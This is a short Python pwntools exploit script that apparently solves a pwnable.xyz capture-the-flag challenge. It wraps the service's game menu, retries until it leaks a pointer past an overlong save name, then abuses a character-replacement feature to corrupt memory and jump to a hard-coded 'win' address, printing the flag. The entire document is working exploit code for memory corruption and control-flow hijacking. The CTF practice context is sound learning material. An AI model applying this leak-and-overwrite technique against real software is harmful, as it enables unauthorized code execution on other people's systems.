from pwn import *
win = 0x400cf3

def choose(choice):
	p.sendlineafter('> ', str(choice))

def playGame(n1, n2):
	choose(1)
	p.sendline(str(n1))
	p.sendline(str(n2))

def saveGame(saveName):
	choose(2)
	p.sendafter('Save name: ', saveName)

def deleteGame(idx):
	choose(3)
	p.sendlineafter('Save #: ', str(idx))

def printName():
	choose(4)
	p.recvuntil('Save name: ')
	return p.recvuntil('\n')[:-1]

def changeChar(c1, c2):
	choose(5)
	p.sendlineafter('Char to replace: ', c1)
	p.sendlineafter('New char: ', c2)


while True:
	p = remote('svc.pwnable.xyz', 30015)
	p.sendafter('Name: ', 'A'*0x7f)
	saveGame('B'*0x80)
	name = printName()
	leak = name[0x80:]
	if len(leak)==4:
		print 'fuck yeah'
		break
	else:
		p.close()	

byte = name[0x80]	
changeByte = p8(u8(byte)-0x20)
changeChar(byte, changeByte)
playGame(0x22222222^2, 2)

choose(5)
p.sendline()
p.sendline('\x00')

changeChar('\x6b', '\xf3')
changeChar('\x0d', '\x0c')
choose(1)
print p.recvuntil('}')